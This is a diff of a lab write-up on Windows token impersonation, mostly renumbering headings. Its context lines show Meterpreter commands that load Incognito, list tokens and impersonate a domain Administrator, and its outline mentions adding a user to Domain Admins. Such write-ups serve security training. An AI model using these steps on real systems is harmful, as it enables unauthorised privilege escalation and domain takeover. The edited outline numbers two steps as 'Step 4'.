@@ -21,7 +21,7 @@
 - [Step 2 - Check UID](#step-2-check-uid)
 - [Step 3 - Load Incognito](#step-3---load-incognito)
 - [Step 4 - List Available Tokens](#step-4---list-available-tokens)
-- [Step 5 - Impersonate Administrator Token](#step-5---impersonate-the-administrator-token)
+- [Step 4 - Impersonate the Administrator Token](#step-5---impersonate-the-administrator-token)
 - [Step 6 - Verify Access](#step-6---verify-access)
   - [6.1 Create Domain User](#step-61---create-a-domain-user)
   - [6.2 Add User to Domain Admins Group](#step-62---add-a-user-to-the-domain-admins-group)
@@ -74,9 +74,9 @@ Gain Elevated Privileges
 
 ## Step 1 - Get a Meterpreter Session
 
-### Starting Metasploit
+### 1.1 Start Metasploit
 
-### Step 1.1: Run the following command to start the Metasploit console:
+Run the following command to start the Metasploit console:
 
 ```bash
 msfconsole -q
@@ -366,7 +366,7 @@ Server username: NT AUTHORITY\SYSTEM
   <img src="/writeups/token impersonation attack/images/step2-1.png" width="600">
 </p>
 
-## Step 2 - Load Incognito
+## Step 3 - Load Incognito
 
 The Incognito extension allows token enumeration and impersonation.
 
@@ -381,7 +381,7 @@ meterpreter > load incognito
 Loading extension incognito...Success.
 ```
 
-## Step 3 - List Available Tokens
+## Step 4 - List Available Tokens
 
 ```bash
 meterpreter > list_tokens -u
@@ -425,7 +425,7 @@ meterpreter > impersonate_token READTEAMBD\\Administrator
 [+] Successfully impersonated user READTEAMBD\Administrator
 ```
 
-## Step 5 - Verify Access
+## Step 6 - Verify Access
 
 ```bash
 getuid
